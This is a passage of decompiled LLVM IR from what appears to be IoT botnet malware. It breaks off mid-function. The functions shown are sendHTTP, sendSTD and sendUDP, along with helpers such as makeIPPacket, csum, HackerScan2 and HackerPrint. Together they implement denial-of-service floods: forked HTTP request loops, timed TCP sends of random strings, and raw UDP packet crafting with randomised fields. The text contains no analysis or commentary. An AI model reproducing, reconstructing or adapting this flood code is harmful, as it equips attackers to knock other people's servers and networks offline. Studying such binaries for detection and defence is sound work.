dec_label_pc_fbd4:                                ; preds = %dec_label_pc_fb2c
  br label %dec_label_pc_fc14

dec_label_pc_fbe0:                                ; preds = %dec_label_pc_fb2c
  %v3_fbf0 = bitcast i32* %stack_var_-40 to %sockaddr*
  %v4_fbf0 = call i32 @__libc_connect(i32 %v0_fb9c, %sockaddr* %v3_fbf0, i32 16)
  %v3_fbf8 = icmp eq i32 %v4_fbf0, -1
  br i1 %v3_fbf8, label %dec_label_pc_fc00, label %dec_label_pc_fc0c

dec_label_pc_fc00:                                ; preds = %dec_label_pc_fbe0
  br label %dec_label_pc_fc14

dec_label_pc_fc0c:                                ; preds = %dec_label_pc_fbe0
  br label %dec_label_pc_fc14

dec_label_pc_fc14:                                ; preds = %dec_label_pc_fc00, %dec_label_pc_fbd4, %dec_label_pc_fb20, %dec_label_pc_fc0c
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_fb20 ], [ 0, %dec_label_pc_fbd4 ], [ 0, %dec_label_pc_fc00 ], [ %v0_fb9c, %dec_label_pc_fc0c ]
  store i32 %v3_fadc, i32* @fp, align 4
  ret i32 %stack_var_-56.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_fc14, { 3, 0, 1, 2 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i8 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = sext i8 %arg3 to i32
  %stack_var_-804 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_fc28 = load i32, i32* @r4, align 4
  store i32 %v3_fc28, i32* %stack_var_-20, align 4
  %v6_fc28 = load i32, i32* @fp, align 4
  store i32 64560, i32* %stack_var_-4, align 4
  %v16_fc28 = ptrtoint i32* %stack_var_-20 to i32
  %v2_fc2c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_fc2c, i32* @fp, align 4
  %v2_fc50 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_fc50, i32* @r0, align 4
  store i32 ptrtoint ([62 x i8*]* @global_var_1ea54.687 to i32), i32* @r1, align 4
  store i32 248, i32* @r2, align 4
  %v0_fc64 = call i32 @memcpy()
  %v2_fc7c = call i32 @__GI_time(i32* null)
  %v3_fc84 = load i32, i32* %stack_var_0, align 4
  %v2_fc88 = add i32 %v3_fc84, %v2_fc7c
  %v0_fc90 = call i32 @random()
  %v2_fca0 = srem i32 %v0_fc90, 3
  %v3_fcb4 = mul nsw i32 %v2_fca0, 4
  %v2_fcbc = add i32 %v3_fcb4, %v16_fc28
  %v2_fcc0 = add i32 %v2_fcbc, -272
  %v1_fcc4 = inttoptr i32 %v2_fcc0 to i32*
  %v2_fcc4 = load i32, i32* %v1_fcc4, align 4
  store i32 %v2_fcc4, i32* @r4, align 4
  %v0_fcc8 = call i32 @random()
  %v2_fd00 = ptrtoint i32* %stack_var_-804 to i32
  store i32 %v2_fd00, i32* @r0, align 4
  %v3_fd1c = call i32 @sprintf(i32 %v2_fd00, i32 ptrtoint ([62 x i8]* @global_var_1eb4c.696 to i32))
  br label %dec_label_pc_fdc8

dec_label_pc_fd2c:                                ; preds = %dec_label_pc_fdc8
  %v0_fd2c = call i32 @__libc_fork()
  %v2_fd34 = icmp eq i32 %v0_fd2c, 0
  %v1_fdc0 = add nuw i32 %storemerge2, 1
  br i1 %v2_fd34, label %dec_label_pc_fdc8, label %dec_label_pc_fd9c.preheader

dec_label_pc_fd9c.preheader:                      ; preds = %dec_label_pc_fd2c
  %tmp27 = bitcast i32* %stack_var_-804 to i8*
  br label %dec_label_pc_fd9c

dec_label_pc_fd40:                                ; preds = %dec_label_pc_fd9c
  %v5_fd5c = call i32 @socket_connect(i32 %arg1, i8 %arg3, i32 %tmp)
  %v2_fd6c = icmp eq i32 %v5_fd5c, 0
  br i1 %v2_fd6c, label %dec_label_pc_fd9c, label %dec_label_pc_fd74

dec_label_pc_fd74:                                ; preds = %dec_label_pc_fd40
  %v3_fd7c = call i32 @strlen(i8* %tmp27)
  store i32 %v3_fd7c, i32* @r2, align 4
  %v3_fd90 = call i32 @__libc_write(i32 %v5_fd5c, i32* nonnull %stack_var_-804)
  %v1_fd98 = call i32 @__libc_close(i32 %v5_fd5c)
  br label %dec_label_pc_fd9c

dec_label_pc_fd9c:                                ; preds = %dec_label_pc_fd40, %dec_label_pc_fd74, %dec_label_pc_fd9c.preheader
  %v2_fda0 = call i32 @__GI_time(i32* null)
  %v5_fdb0 = icmp slt i32 %v2_fda0, %v2_fc88
  br i1 %v5_fdb0, label %dec_label_pc_fd40, label %dec_label_pc_fdb4

dec_label_pc_fdb4:                                ; preds = %dec_label_pc_fd9c
  %v1_fdb8 = call i32 @__GI__exit(i32 1)
  unreachable

dec_label_pc_fdc8:                                ; preds = %dec_label_pc_fd2c, %entry
  %v12_fddc = phi i32 [ %v3_fd1c, %entry ], [ 0, %dec_label_pc_fd2c ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v1_fdc0, %dec_label_pc_fd2c ]
  %v5_fdd4 = icmp slt i32 %storemerge2, %arg6
  br i1 %v5_fdd4, label %dec_label_pc_fd2c, label %dec_label_pc_fdd8

dec_label_pc_fdd8:                                ; preds = %dec_label_pc_fdc8
  %v2_fddc = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_fddc, i32* @r4, align 4
  store i32 %v6_fc28, i32* @fp, align 4
  ret i32 %v12_fddc

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32 %v5_fd5c, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_fd9c, { 1, 0, 2 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_fdf0 = load i32, i32* @fp, align 4
  store i32 %v3_fdf0, i32* %stack_var_-16, align 4
  store i32 65016, i32* %stack_var_-4, align 4
  %v13_fdf0 = ptrtoint i32* %stack_var_-16 to i32
  %v2_fdf4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_fdf4, i32* @fp, align 4
  store i32 %arg3, i32* %stack_var_-208, align 4
  %v0_fe14 = call i32 @socket()
  %v2_fe24 = call i32 @__GI_time(i32* null)
  %v1_fe38 = call i32 @__GI_gethostbyname(i32 %arg1)
  store i32 16, i32* @r2, align 4
  %v2_fe54 = bitcast i32* %stack_var_-52 to i8*
  %v3_fe54 = call i32 @__GI_memset(i8* %v2_fe54, i32 0)
  %v1_fe5c = add i32 %v1_fe38, 16
  %v2_fe5c = inttoptr i32 %v1_fe5c to i32*
  %v3_fe5c = load i32, i32* %v2_fe5c, align 4
  %v1_fe60 = inttoptr i32 %v3_fe5c to i32*
  %v2_fe60 = load i32, i32* %v1_fe60, align 4
  %v2_fe68 = ptrtoint i32* %stack_var_-48 to i32
  %v1_fe70 = add i32 %v1_fe38, 12
  %v2_fe70 = inttoptr i32 %v1_fe70 to i32*
  %v3_fe70 = load i32, i32* %v2_fe70, align 4
  store i32 %v3_fe70, i32* @r2, align 4
  %v3_fe80 = call i32 @bcopy(i32 %v2_fe60, i32 %v2_fe68, i32 %v3_fe70)
  %v1_fe88 = add i32 %v1_fe38, 8
  %v2_fe88 = inttoptr i32 %v1_fe88 to i32*
  %v3_fe88 = load i32, i32* %v2_fe88, align 4
  %v3_fe90 = urem i32 %v3_fe88, 65536
  store i32 %v3_fe90, i32* %stack_var_-52, align 4
  %v2_fec4 = ptrtoint i32* %stack_var_-196 to i32
  %v3_ff40 = bitcast i32* %stack_var_-52 to %sockaddr*
  %v2_ff00 = add i32 %v13_fdf0, -180
  br label %dec_label_pc_fec0

dec_label_pc_fec0:                                ; preds = %dec_label_pc_ff7c, %entry
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_ff80, %dec_label_pc_ff7c ]
  store i32 %v2_fec4, i32* @r0, align 4
  store i32 ptrtoint ([36 x i8*]* @global_var_1ed48.734 to i32), i32* @r1, align 4
  store i32 144, i32* @r2, align 4
  %v0_fed8 = call i32 @memcpy()
  %v0_fedc = call i32 @random()
  %tmp = icmp ult i32 %storemerge3, 50
  br i1 %tmp, label %dec_label_pc_ff7c, label %dec_label_pc_ff1c

dec_label_pc_ff1c:                                ; preds = %dec_label_pc_fec0
  %v2_feec = urem i32 %v0_fedc, 36
  %v3_fef8 = mul nuw nsw i32 %v2_feec, 4
  %v2_ff04 = add i32 %v2_ff00, %v3_fef8
  %v1_ff08 = inttoptr i32 %v2_ff04 to i32*
  %v2_ff08 = load i32, i32* %v1_ff08, align 4
  %v5_ff2c = inttoptr i32 %v2_ff08 to i32*
  %v6_ff2c = call i32 @__libc_send(i32 %v0_fe14, i32* %v5_ff2c, i32 75, i32 0)
  %v4_ff40 = call i32 @__libc_connect(i32 %v0_fe14, %sockaddr* %v3_ff40, i32 16)
  %v2_ff48 = call i32 @__GI_time(i32* null)
  %v3_ff54 = load i32, i32* %stack_var_-208, align 4
  %v2_ff58 = add i32 %v3_ff54, %v2_fe24
  %v5_ff60 = icmp slt i32 %v2_ff48, %v2_ff58
  br i1 %v5_ff60, label %dec_label_pc_ff74, label %dec_label_pc_ff64

dec_label_pc_ff64:                                ; preds = %dec_label_pc_ff1c
  %v1_ff68 = call i32 @__libc_close(i32 %v0_fe14)
  %v1_ff70 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_ff74:                                ; preds = %dec_label_pc_ff1c
  br label %dec_label_pc_ff7c

dec_label_pc_ff7c:                                ; preds = %dec_label_pc_fec0, %dec_label_pc_ff74
  %stack_var_-24.0 = phi i32 [ %storemerge3, %dec_label_pc_fec0 ], [ 0, %dec_label_pc_ff74 ]
  %v1_ff80 = add i32 %stack_var_-24.0, 1
  br label %dec_label_pc_fec0

; uselistorder directives
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v3_fe70, { 1, 0 }
  uselistorder i32 %v1_fe38, { 2, 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ff7c, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_ff94 = load i32, i32* @r4, align 4
  %v6_ff94 = load i32, i32* @fp, align 4
  store i32 65436, i32* %stack_var_-4, align 4
  %v2_ff98 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_ff98, i32* @fp, align 4
  %v2_ff9c = ptrtoint i32* %stack_var_-136 to i32
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-76, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_ffc4 = icmp eq i32 %arg2, 0
  br i1 %v2_ffc4, label %dec_label_pc_ffcc, label %dec_label_pc_ffec

dec_label_pc_ffcc:                                ; preds = %entry
  %v0_ffcc = call i32 @rand_cmwc()
  %v3_ffd4 = mul i32 %v0_ffcc, 65536
  store i32 %v3_ffd4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010

dec_label_pc_ffec:                                ; preds = %entry
  %v3_fff4 = urem i32 %arg2, 65536
  store i32 %v3_fff4, i32* %r3.global-to-local, align 4
  %v1_fffc = call i32 @htons(i32 %v3_fff4)
  br label %dec_label_pc_10010

dec_label_pc_10010:                               ; preds = %dec_label_pc_ffcc, %dec_label_pc_ffec
  %v2_10014 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_10014, i32* %r3.global-to-local, align 4
  %v3_10020 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-72)
  store i32 %v3_10020, i32* %r3.global-to-local, align 4
  %v2_10028 = icmp eq i32 %v3_10020, 0
  br i1 %v2_10028, label %dec_label_pc_10030, label %dec_label_pc_105dc

dec_label_pc_10030:                               ; preds = %dec_label_pc_10010
  %v2_10030 = ptrtoint i32* %stack_var_-76 to i32
  %v2_10034 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_10034, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-68, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v7_10054 = icmp eq i32 %arg4, 32
  br i1 %v7_10054, label %dec_label_pc_1005c, label %dec_label_pc_1019c

dec_label_pc_1005c:                               ; preds = %dec_label_pc_10030
  store i32 17, i32* @r2, align 4
  %v0_10068 = call i32 @socket()
  store i32 %v0_10068, i32* %r3.global-to-local, align 4
  %v2_10078 = icmp eq i32 %v0_10068, 0
  br i1 %v2_10078, label %dec_label_pc_10080, label %dec_label_pc_10098

dec_label_pc_10080:                               ; preds = %dec_label_pc_1005c
  %v2_10084 = load i32, i32* @global_var_28c44.54, align 4
  store i32 %v2_10084, i32* %r3.global-to-local, align 4
  %v3_10090 = call i32 @HackerPrint(i32 %v2_10084, i32 ptrtoint ([27 x i8]* @global_var_1edd8.737 to i32))
  br label %dec_label_pc_105dc

dec_label_pc_10098:                               ; preds = %dec_label_pc_1005c
  %v3_10098 = load i32, i32* %stack_var_0, align 4
  %v1_1009c = add i32 %v3_10098, 1
  store i32 %v1_1009c, i32* %r3.global-to-local, align 4
  %v1_100a4 = call i32 @malloc(i32 %v1_1009c)
  store i32 %v1_100a4, i32* %r3.global-to-local, align 4
  %v2_100b4 = icmp eq i32 %v1_100a4, 0
  br i1 %v2_100b4, label %dec_label_pc_105dc, label %dec_label_pc_100bc

dec_label_pc_100bc:                               ; preds = %dec_label_pc_10098
  %v3_100bc = load i32, i32* %stack_var_0, align 4
  %v1_100c0 = add i32 %v3_100bc, 1
  store i32 %v1_100c0, i32* @r2, align 4
  store i32 %v1_100a4, i32* %r3.global-to-local, align 4
  %v2_100d4 = inttoptr i32 %v1_100a4 to i8*
  %v3_100d4 = call i32 @__GI_memset(i8* %v2_100d4, i32 0)
  %v2_100e0 = call i32 @makeRandomStr(i32 %v1_100a4, i32 %v3_100bc)
  %v2_100e8 = call i32 @__GI_time(i32* null)
  %v2_100f4 = add i32 %v2_100e8, %arg3
  store i32 %v2_100f4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v6_1012c = inttoptr i32 %v1_100a4 to i32*
  br label %dec_label_pc_10108

dec_label_pc_10108:                               ; preds = %dec_label_pc_1018c, %dec_label_pc_10180, %dec_label_pc_100bc
  %stack_var_-104.0 = phi i32 [ 0, %dec_label_pc_100bc ], [ 0, %dec_label_pc_10180 ], [ %v1_10190, %dec_label_pc_1018c ]
  %v3_10108 = load i32, i32* %stack_var_0, align 4
  store i32 %v2_10030, i32* %stack_var_-136, align 4
  store i32 %v3_10108, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_1012c = call i32 @__libc_sendto(i32 %v0_10068, i32* %v6_1012c, i32 %v3_10108, i32 0, i32 %v2_10030, i32 16)
  store i32 %stack_var_-104.0, i32* %r3.global-to-local, align 4
  %v9_10138 = icmp eq i32 %stack_var_-104.0, %arg6
  br i1 %v9_10138, label %dec_label_pc_10140, label %dec_label_pc_1018c

dec_label_pc_10140:                               ; preds = %dec_label_pc_10108
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_ffc4, label %dec_label_pc_1014c, label %dec_label_pc_10168

dec_label_pc_1014c:                               ; preds = %dec_label_pc_10140
  %v0_1014c = call i32 @rand_cmwc()
  %v3_10158 = udiv i32 %v0_1014c, 256
  %v3_101605 = urem i32 %v3_10158, 256
  store i32 %v3_101605, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10168

dec_label_pc_10168:                               ; preds = %dec_label_pc_10140, %dec_label_pc_1014c
  %v2_1016c = call i32 @__GI_time(i32* null)
  store i32 %v2_1016c, i32* %r2.global-to-local, align 4
  store i32 %v2_100f4, i32* %r3.global-to-local, align 4
  %v8_1017c = icmp sgt i32 %v2_1016c, %v2_100f4
  br i1 %v8_1017c, label %dec_label_pc_105dc, label %dec_label_pc_10180

dec_label_pc_10180:                               ; preds = %dec_label_pc_10168
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10108

dec_label_pc_1018c:                               ; preds = %dec_label_pc_10108
  %v1_10190 = add i32 %stack_var_-104.0, 1
  store i32 %v1_10190, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10108

dec_label_pc_1019c:                               ; preds = %dec_label_pc_10030
  store i32 %v2_ff9c, i32* %r3.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v0_101b0 = call i32 @socket()
  store i32 %v0_101b0, i32* %r3.global-to-local, align 4
  %v2_101c0 = icmp eq i32 %v0_101b0, 0
  br i1 %v2_101c0, label %dec_label_pc_101c8, label %dec_label_pc_101e0

dec_label_pc_101c8:                               ; preds = %dec_label_pc_1019c
  %v2_101cc = load i32, i32* @global_var_28c44.54, align 4
  store i32 %v2_101cc, i32* %r3.global-to-local, align 4
  %v3_101d8 = call i32 @HackerPrint(i32 %v2_101cc, i32 ptrtoint ([27 x i8]* @global_var_1edd8.737 to i32))
  br label %dec_label_pc_105d8

dec_label_pc_101e0:                               ; preds = %dec_label_pc_1019c
  store i32 1, i32* %stack_var_-80, align 4
  %v2_101e8 = ptrtoint i32* %stack_var_-80 to i32
  store i32 4, i32* %stack_var_-136, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_101e8, i32* %r3.global-to-local, align 4
  %v6_10204 = call i32 @__GI_setsockopt(i32 %v0_101b0, i32 0, i32 3, i32* nonnull %stack_var_-80, i32 4)
  store i32 %v6_10204, i32* %r3.global-to-local, align 4
  %v1_1020c = icmp slt i32 %v6_10204, 0
  br i1 %v1_1020c, label %dec_label_pc_10214, label %dec_label_pc_1022c

dec_label_pc_10214:                               ; preds = %dec_label_pc_101e0
  %v2_10218 = load i32, i32* @global_var_28c44.54, align 4
  store i32 %v2_10218, i32* %r3.global-to-local, align 4
  %v3_10224 = call i32 @HackerPrint(i32 %v2_10218, i32 ptrtoint ([33 x i8]* @global_var_1edf4.739 to i32))
  br label %dec_label_pc_105d8

dec_label_pc_1022c:                               ; preds = %dec_label_pc_101e0
  store i32 49, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10238

dec_label_pc_10238:                               ; preds = %dec_label_pc_1022c, %dec_label_pc_10238
  %v1_1027024 = phi i32 [ 49, %dec_label_pc_1022c ], [ %v1_10270, %dec_label_pc_10238 ]
  %v2_1023c = call i32 @__GI_time(i32* null)
  store i32 %v2_1023c, i32* %r3.global-to-local, align 4
  store i32 %v2_1023c, i32* @r4, align 4
  %v0_10248 = call i32 @rand_cmwc()
  %v0_10250 = load i32, i32* @r4, align 4
  %v2_10250 = xor i32 %v0_10250, %v0_10248
  store i32 %v2_10250, i32* %r3.global-to-local, align 4
  %v1_10258 = call i32 @srand(i32 %v2_10250)
  %v0_1025c = call i32 @random()
  store i32 %v0_1025c, i32* %r3.global-to-local, align 4
  %v1_10268 = call i32 @init_rand(i32 %v0_1025c)
  %v1_10270 = add nsw i32 %v1_1027024, -1
  store i32 %v1_10270, i32* %r3.global-to-local, align 4
  %v3_1027c = icmp eq i32 %v1_1027024, 0
  br i1 %v3_1027c, label %dec_label_pc_10284, label %dec_label_pc_10238

dec_label_pc_10284:                               ; preds = %dec_label_pc_10238
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v2_10288 = icmp eq i32 %arg4, 0
  br i1 %v2_10288, label %dec_label_pc_102b4, label %dec_label_pc_1029c

dec_label_pc_1029c:                               ; preds = %dec_label_pc_10284
  %v1_102a0 = sub i32 32, %arg4
  store i32 %v1_102a0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_102ac = shl i32 -1, %v1_102a0
  br label %dec_label_pc_102b4

dec_label_pc_102b4:                               ; preds = %dec_label_pc_10284, %dec_label_pc_1029c
  %storemerge12 = phi i32 [ %v1_102ac, %dec_label_pc_1029c ], [ 0, %dec_label_pc_10284 ]
  %v3_102b4 = load i32, i32* %stack_var_0, align 4
  %v1_102b8 = add i32 %v3_102b4, 28
  %v1_102c8 = add i32 %v3_102b4, 34
  %v3_102cc = and i32 %v1_102c8, -4
  %v1_102d4 = load i32, i32* @sp, align 4
  %v2_102d4 = sub i32 %v1_102d4, %v3_102cc
  %v1_102d8 = add i32 %v2_102d4, 8
  store i32 %v1_102d8, i32* %r2.global-to-local, align 4
  %v1_102e4 = add i32 %v2_102d4, 11
  %v3_102e8 = and i32 %v1_102e4, -4
  %v1_10308 = add i32 %v3_102e8, 20
  store i32 %v1_10308, i32* %r3.global-to-local, align 4
  %v5_1030c = inttoptr i32 %v1_10308 to i8*
  %v3_10310 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_10310, i32* @r4, align 4
  %v1_10318 = call i32 @HackerScan2(i32 %storemerge12)
  store i32 %v1_10318, i32* %r3.global-to-local, align 4
  %v1_10324 = call i32 @htonl(i32 %v1_10318)
  store i32 %v1_10324, i32* %r2.global-to-local, align 4
  %v3_1032c = load i32, i32* %stack_var_0, align 4
  %v1_10330 = add i32 %v3_1032c, 8
  %v1_10334 = load i32, i32* @sp, align 4
  %v2_10334 = inttoptr i32 %v1_10334 to i32*
  store i32 %v1_10330, i32* %v2_10334, align 4
  %v0_1033c = load i32, i32* @r4, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v4_10344 = inttoptr i32 %v3_102e8 to i8*
  %v5_10344 = call i32 @makeIPPacket(i8* %v4_10344, i32 %v0_1033c, i32 %v1_10324, i32 17)
  %v3_10348 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_10348, 8
  %v3_1035c = urem i32 %fold, 65536
  store i32 %v3_1035c, i32* %r3.global-to-local, align 4
  %v1_10364 = call i32 @htons(i32 %v3_1035c)
  %sext = mul i32 %v1_10364, 16777216
  %v1_10368 = sdiv i32 %sext, 16777216
  store i32 %v1_10368, i32* %r3.global-to-local, align 4
  store i32 %v1_10308, i32* %r2.global-to-local, align 4
  %v1_10370 = trunc i32 %v1_10368 to i8
  %v3_10370 = add i32 %v3_102e8, 24
  %v4_10370 = inttoptr i32 %v3_10370 to i8*
  store i8 %v1_10370, i8* %v4_10370, align 4
  %v0_10374 = load i32, i32* %r3.global-to-local, align 4
  %v3_10374 = sdiv i32 %v0_10374, 256
  store i32 %v3_10374, i32* %r3.global-to-local, align 4
  %v1_10378 = trunc i32 %v3_10374 to i8
  %v2_10378 = load i32, i32* %r2.global-to-local, align 4
  %v3_10378 = add i32 %v2_10378, 5
  %v4_10378 = inttoptr i32 %v3_10378 to i8*
  store i8 %v1_10378, i8* %v4_10378, align 1
  %v0_1037c = call i32 @rand_cmwc()
  %v3_10388 = urem i32 %v0_1037c, 65536
  store i32 %v3_10388, i32* %r3.global-to-local, align 4
  store i32 %v1_10308, i32* %r2.global-to-local, align 4
  %v1_10390 = trunc i32 %v0_1037c to i8
  store i8 %v1_10390, i8* %v5_1030c, align 4
  %v0_10394 = load i32, i32* %r3.global-to-local, align 4
  %v3_1039432 = udiv i32 %v0_10394, 256
  %v1_10398 = trunc i32 %v3_1039432 to i8
  %v2_10398 = load i32, i32* %r2.global-to-local, align 4
  %v3_10398 = add i32 %v2_10398, 1
  %v4_10398 = inttoptr i32 %v3_10398 to i8*
  store i8 %v1_10398, i8* %v4_10398, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_ffc4, label %dec_label_pc_103a8, label %dec_label_pc_103c0

dec_label_pc_103a8:                               ; preds = %dec_label_pc_102b4
  %v0_103a8 = call i32 @rand_cmwc()
  %v3_103b0 = mul i32 %v0_103a8, 65536
  store i32 %v3_103b0, i32* %r3.global-to-local, align 4
  %extract.t = trunc i32 %v0_103a8 to i8
  br label %dec_label_pc_103dc

dec_label_pc_103c0:                               ; preds = %dec_label_pc_102b4
  %v3_103c8 = urem i32 %arg2, 65536
  store i32 %v3_103c8, i32* %r3.global-to-local, align 4
  %v1_103d0 = call i32 @htons(i32 %v3_103c8)
  %extract.t90 = trunc i32 %v1_103d0 to i8
  br label %dec_label_pc_103dc

dec_label_pc_103dc:                               ; preds = %dec_label_pc_103a8, %dec_label_pc_103c0
  %v0_103a8.sink.off0 = phi i8 [ %extract.t, %dec_label_pc_103a8 ], [ %extract.t90, %dec_label_pc_103c0 ]
  %v3_104ec.pre-phi = phi i32 [ 0, %dec_label_pc_103a8 ], [ %v3_103c8, %dec_label_pc_103c0 ]
  store i32 %v1_10308, i32* %r2.global-to-local, align 4
  %v4_103e0 = sext i8 %v0_103a8.sink.off0 to i32
  %v3_103e4 = add i32 %v3_102e8, 22
  %v4_103e4 = inttoptr i32 %v3_103e4 to i8*
  store i8 %v0_103a8.sink.off0, i8* %v4_103e4, align 2
  %v3_103ec36 = udiv i32 %v4_103e0, 256
  %v1_103f0 = trunc i32 %v3_103ec36 to i8
  %v2_103f0 = load i32, i32* %r2.global-to-local, align 4
  %v3_103f0 = add i32 %v2_103f0, 3
  %v4_103f0 = inttoptr i32 %v3_103f0 to i8*
  store i8 %v1_103f0, i8* %v4_103f0, align 1
  store i32 %v1_10308, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_103fc = add i32 %v3_102e8, 26
  %v4_103fc = inttoptr i32 %v3_103fc to i8*
  store i8 0, i8* %v4_103fc, align 2
  %v0_10400 = load i32, i32* %r3.global-to-local, align 4
  %v1_10400 = trunc i32 %v0_10400 to i8
  %v2_10400 = load i32, i32* %r2.global-to-local, align 4
  %v3_10400 = add i32 %v2_10400, 7
  %v4_10400 = inttoptr i32 %v3_10400 to i8*
  store i8 %v1_10400, i8* %v4_10400, align 1
  %v1_10408 = add i32 %v3_102e8, 28
  store i32 %v1_10408, i32* %r3.global-to-local, align 4
  %v3_10410 = load i32, i32* %stack_var_0, align 4
  %v2_10414 = call i32 @makeRandomStr(i32 %v1_10408, i32 %v3_10410)
  %v1_10424 = or i32 %v3_102e8, 2
  store i32 %v1_10424, i32* %r3.global-to-local, align 4
  %v1_10428 = inttoptr i32 %v1_10424 to i8*
  %v2_10428 = load i8, i8* %v1_10428, align 2
  %v3_10428 = zext i8 %v2_10428 to i32
  store i32 %v3_10428, i32* %r2.global-to-local, align 4
  %v1_1042c = or i32 %v1_102e4, 3
  %v2_1042c = inttoptr i32 %v1_1042c to i8*
  %v3_1042c = load i8, i8* %v2_1042c, align 1
  %v4_1042c = zext i8 %v3_1042c to i32
  %v4_10430 = mul nuw nsw i32 %v4_1042c, 256
  %v5_10430 = or i32 %v4_10430, %v3_10428
  store i32 %v5_10430, i32* %r3.global-to-local, align 4
  %v3_1043c = call i32 @csum(i8* %v4_10344, i32 %v5_10430)
  %sext6 = mul i32 %v3_1043c, 16777216
  %v1_10440 = sdiv i32 %sext6, 16777216
  store i32 %v1_10440, i32* %r3.global-to-local, align 4
  store i32 %v3_102e8, i32* %r2.global-to-local, align 4
  %v1_10448 = trunc i32 %v1_10440 to i8
  %v3_10448 = add i32 %v3_102e8, 10
  %v4_10448 = inttoptr i32 %v3_10448 to i8*
  store i8 %v1_10448, i8* %v4_10448, align 2
  %v0_1044c = load i32, i32* %r3.global-to-local, align 4
  %v3_1044c = sdiv i32 %v0_1044c, 256
  store i32 %v3_1044c, i32* %r3.global-to-local, align 4
  %v1_10450 = trunc i32 %v3_1044c to i8
  %v2_10450 = load i32, i32* %r2.global-to-local, align 4
  %v3_10450 = add i32 %v2_10450, 11
  %v4_10450 = inttoptr i32 %v3_10450 to i8*
  store i8 %v1_10450, i8* %v4_10450, align 1
  %v2_10458 = call i32 @__GI_time(i32* null)
  %v2_10464 = add i32 %v2_10458, %arg3
  store i32 %v2_10464, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_1052c = add i32 %v3_102e8, 4
  %v4_1052c = inttoptr i32 %v3_1052c to i8*
  %v2_10554 = add i32 %v3_102e8, 12
  %v3_10554 = inttoptr i32 %v2_10554 to i32*
  br label %dec_label_pc_10478

dec_label_pc_10478:                               ; preds = %dec_label_pc_105c8, %dec_label_pc_105bc, %dec_label_pc_103dc
  %stack_var_-100.0 = phi i32 [ 0, %dec_label_pc_103dc ], [ 0, %dec_label_pc_105bc ], [ %v1_105cc, %dec_label_pc_105c8 ]
  store i32 %v3_102e8, i32* %r2.global-to-local, align 4
  %v1_10480 = load i32, i32* @sp, align 4
  %v2_10480 = inttoptr i32 %v1_10480 to i32*
